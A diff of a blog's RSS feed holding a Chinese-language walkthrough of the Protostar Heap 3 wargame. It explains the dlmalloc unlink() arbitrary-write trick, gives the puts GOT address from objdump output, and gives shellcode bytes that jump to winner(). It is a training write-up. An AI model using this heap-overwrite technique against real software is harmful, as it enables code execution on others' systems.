@@ -6,21 +6,24 @@
         <description>Recent content in Binary on Welcome to Rokkenjima</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Wed, 06 Apr 2022 00:00:00 +0000</lastBuildDate><atom:link href="/categories/binary/index.xml" rel="self" type="application/rss+xml" /><item>
-        <title>Protostar Format 3 Walkthrough</title>
+        <lastBuildDate>Thu, 07 Apr 2022 00:00:00 +0000</lastBuildDate><atom:link href="/categories/binary/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Protostar Heap 3 Walkthrough</title>
         <link>/p/protostar_heap_3/</link>
-        <pubDate>Wed, 06 Apr 2022 00:00:00 +0000</pubDate>
+        <pubDate>Thu, 07 Apr 2022 00:00:00 +0000</pubDate>
         
         <guid>/p/protostar_heap_3/</guid>
-        <description>&lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;
-&lt;p&gt;其实到目前为止我并没有全部理解&lt;/p&gt;
-&lt;p&gt;但是因为思路很乱有点理不清了，所以姑且把已经理解的部分记下来&lt;/p&gt;
+        <description>&lt;img src="/p/protostar_heap_3/cover.png" alt="Featured image of post Protostar Heap 3 Walkthrough" /&gt;&lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;
 &lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://phrack.org/issues/57/9.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;Once upon a free()&amp;hellip;&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://conceptofproof.wordpress.com/2013/11/19/protostar-heap3-walkthrough/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;Protostar Heap3 Walkthrough | conceptofproof&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://airman604.medium.com/protostar-heap-3-walkthrough-56d9334bcd13&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Protostar Heap 3 Walkthrough | Airman&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://youtu.be/HWhzH--89UQ&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;The Heap: dlmalloc unlink() exploit - bin 0x18&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;其实起笔的时候还并不是特别理解&lt;/p&gt;
+&lt;p&gt;但是因为思路很乱有点理不清了，所以姑且把已经理解的部分记下来&lt;/p&gt;
+&lt;p&gt;然后写着写着就逐渐理解一切x&lt;/p&gt;
 &lt;hr&gt;
 &lt;h2 id=&#34;dlmalloc-basics&#34;&gt;Dlmalloc Basics&lt;/h2&gt;
 &lt;p&gt;使用中的 chunk：&lt;/p&gt;
@@ -177,55 +180,340 @@ nextchunk -&amp;gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;dynamite failed?&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
-&lt;p&gt;我们的目标是把 &lt;code&gt;puts()&lt;/code&gt; 在 Global Offset Table 中记录的地址上，写上能跳转到 &lt;code&gt;winner()&lt;/code&gt; 的 shellcode&lt;/p&gt;
-&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://shell-storm.org/online/Online-Assembler-and-Disassembler/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;可使用这个工具&lt;/a&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;push 0x08048864
+&lt;h2 id=&#34;before-unlink&#34;&gt;Before &lt;code&gt;unlink()&lt;/code&gt;&lt;/h2&gt;
+&lt;p&gt;我们的目标是把 &lt;code&gt;puts()&lt;/code&gt; 在动态链接表中记录的地址，写上能跳转到 &lt;code&gt;winner()&lt;/code&gt; 的 shellcode&lt;/p&gt;
+&lt;p&gt;而能帮我们达到以上目的的函数就是 &lt;code&gt;free()&lt;/code&gt;， 准确来说是 &lt;code&gt;unlink()&lt;/code&gt;，思路如下：&lt;/p&gt;
+&lt;br&gt;
+&lt;p&gt;从现在开始全部考虑代码，不要看上面的流程图：&lt;/p&gt;
+&lt;p&gt;首先，我们所需要的地址有两个：&lt;strong&gt;&lt;code&gt;puts()&lt;/code&gt; 在 GOT 上的地址&lt;/strong&gt; 和 &lt;strong&gt;指向 &lt;code&gt;winner()&lt;/code&gt; shellcode 的地址&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;再看一遍源码， &lt;code&gt;unlink()&lt;/code&gt; 分为四个步骤：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;BK&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bk&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;       
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;FD&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;FD&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bk&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;BK&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;            
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;BK&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;FD&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;还记得一个 chunk 的模型么，&lt;code&gt;prev_size&lt;/code&gt;, &lt;code&gt;size&lt;/code&gt;, &lt;code&gt;fd&lt;/code&gt;, &lt;code&gt;bk&lt;/code&gt; 都是 4 bytes&lt;/p&gt;
+&lt;p&gt;所以出现 &lt;code&gt;P-&amp;gt;fd&lt;/code&gt; 时，实际你可以将其看作 &lt;code&gt;P + 0x8&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;出现 &lt;code&gt;P-&amp;gt;bk&lt;/code&gt; 时，实际你可以将其看作 &lt;code&gt;P + 0xc&lt;/code&gt;&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;堆中一个已被 free 的 chunk 的模型&lt;/th&gt;
+&lt;th&gt;指针（↑表示在一格的起始处）&lt;/th&gt;
+&lt;th&gt;大小&lt;/th&gt;
+&lt;th&gt;可以视作&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;prev_size&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;↑ chunk begins (P)&lt;/td&gt;
+&lt;td&gt;4 bytes&lt;/td&gt;
+&lt;td&gt;P + 0x0&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;size&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;4 bytes&lt;/td&gt;
+&lt;td&gt;P + 0x4&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;fd&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;↑ mem begins&lt;/td&gt;
+&lt;td&gt;4 bytes&lt;/td&gt;
+&lt;td&gt;P + 0x8&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;bk&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;4 bytes&lt;/td&gt;
+&lt;td&gt;P + 0xc&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;如果我们把 &lt;code&gt;P-&amp;gt;bk&lt;/code&gt; 换成 &lt;code&gt;addr of shellcode&lt;/code&gt;，把 &lt;code&gt;P-&amp;gt;fd&lt;/code&gt; 换成 &lt;code&gt;addr of puts()&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;接下来详细展开一下三四步，等量替换：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mf&#34;&gt;1.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;BK&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bk&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mf&#34;&gt;2.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;FD&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mf&#34;&gt;3.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;FD&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bk&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;BK&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;↓&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;BK&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bk&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;FD&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bk&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;FD&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xc&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;↓&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;FD&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bk&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;BK&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;equals&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mf&#34;&gt;4.&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;BK&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;FD&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;↓&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;FD&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;BK&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;BK&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x8&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bk&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x8&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x8&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;↓&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;BK&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;FD&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;equals&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x8&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;出现了！&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;addr of puts()+0xc&lt;/code&gt; = &lt;code&gt;addr of shellcode&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;这就是我们想要的结果！&lt;/p&gt;
+&lt;p&gt;但是还不太对，这边的 &lt;code&gt;addr of puts()&lt;/code&gt; 大了 &lt;code&gt;0xC&lt;/code&gt;，&lt;strong&gt;所以一开始就应该使 &lt;code&gt;P-&amp;gt;fd&lt;/code&gt; = &lt;code&gt;addr of puts() - 0xc&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;而且在第四步还出现了 &lt;code&gt;addr of shellcode+0x8 = addr of puts()&lt;/code&gt;，也就是说这个 shellcode + &lt;code&gt;0x8&lt;/code&gt; 的位置会被 &lt;code&gt;unlink()&lt;/code&gt; 写上 &lt;code&gt;addr of puts()&lt;/code&gt;&amp;hellip;&lt;/p&gt;
+&lt;p&gt;所以 shellcode 得小于 8 bytes&amp;hellip;？&lt;/p&gt;
+&lt;p&gt;&lt;del&gt;对了但没完全对&lt;/del&gt; 请继续往后看吧&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;总之接下来找找到 &lt;code&gt;puts()&lt;/code&gt; 在动态链接表里的地址&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@protostar:/tmp/heap$ objdump -R /opt/protostar/bin/heap3
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/opt/protostar/bin/heap3:     file format elf32-i386
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;DYNAMIC RELOCATION RECORDS
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;OFFSET   TYPE              VALUE 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0804b0e4 R_386_GLOB_DAT    __gmon_start__
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0804b140 R_386_COPY        stderr
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0804b0f4 R_386_JUMP_SLOT   __errno_location
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0804b0f8 R_386_JUMP_SLOT   mmap
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0804b0fc R_386_JUMP_SLOT   sysconf
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0804b100 R_386_JUMP_SLOT   __gmon_start__
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0804b104 R_386_JUMP_SLOT   mremap
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0804b108 R_386_JUMP_SLOT   memset
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0804b10c R_386_JUMP_SLOT   __libc_start_main
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0804b110 R_386_JUMP_SLOT   sbrk
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0804b114 R_386_JUMP_SLOT   memcpy
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0804b118 R_386_JUMP_SLOT   strcpy
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0804b11c R_386_JUMP_SLOT   &lt;span class=&#34;nb&#34;&gt;printf&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0804b120 R_386_JUMP_SLOT   fprintf
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0804b124 R_386_JUMP_SLOT   &lt;span class=&#34;nb&#34;&gt;time&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0804b128 R_386_JUMP_SLOT   puts
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0804b12c R_386_JUMP_SLOT   munmap
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;0x0804b128 - 0xc = 0x0804b11c
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;以及 &lt;code&gt;winner()&lt;/code&gt; 的地址：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;user@protostar:/tmp/heap$ objdump -t /opt/protostar/bin/heap3 | grep winner
+08048864 g     F .text	00000025              winner
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;把它做成 shellcode，使用&lt;a class=&#34;link&#34; href=&#34;http://shell-storm.org/online/Online-Assembler-and-Disassembler/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;这个工具&lt;/a&gt;&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# x86 (32)
+push 0x08048864
 ret
 
-Assembly - Little Endian:
+# Assembly - Little Endian
 &amp;#34;\x68\x64\x88\x04\x08\xc3&amp;#34;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;而能帮我们达到以上目的的函数就是 &lt;code&gt;free()&lt;/code&gt;， 准确来说是 &lt;code&gt;unlink()&lt;/code&gt;，思路如下：&lt;/p&gt;
-&lt;p&gt;首先 &lt;code&gt;strcpy()&lt;/code&gt; 不会检查字符数量，所以可以在堆上写多于 buffer 大小的字符&lt;/p&gt;
-&lt;p&gt;还记得前面提到的 &lt;code&gt;unlink()&lt;/code&gt; 么，它可以往 &lt;code&gt;P-&amp;gt;fd&lt;/code&gt; 和 &lt;code&gt;P-&amp;gt;bk&lt;/code&gt; 上写值&lt;/p&gt;
-&lt;p&gt;这样的话我们可以通过指向 chunk A 的 第一个 &lt;code&gt;strcpy()&lt;/code&gt; 在堆上写出一个 fake chunk，&lt;/p&gt;
-&lt;p&gt;并欺骗 &lt;code&gt;free()&lt;/code&gt; 函数（和里面的  &lt;code&gt;unlink()&lt;/code&gt; ），让它以为 fake chunk 在即将被 &lt;code&gt;free()&lt;/code&gt; 的 chunk 之前，以此欺骗  &lt;code&gt;unlink()&lt;/code&gt; 往我们所想要的地址写值&lt;/p&gt;
-&lt;p&gt;而这个「即将被 free 的 chunk」我们就用 chunk B 吧，&lt;/p&gt;
-&lt;p&gt;那么 chunk B应具有以下特点：&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;啊..但是差点忘了一件事情，就是我们还没弄出一个 &lt;code&gt;P-&amp;gt;bk&lt;/code&gt; = &lt;code&gt;addr of shellcode&lt;/code&gt; 且 &lt;code&gt;P-&amp;gt;fd&lt;/code&gt; = &lt;code&gt;addr of puts() - 0xc&lt;/code&gt; 的 chunk 呢&amp;hellip;&lt;/p&gt;
+&lt;hr&gt;
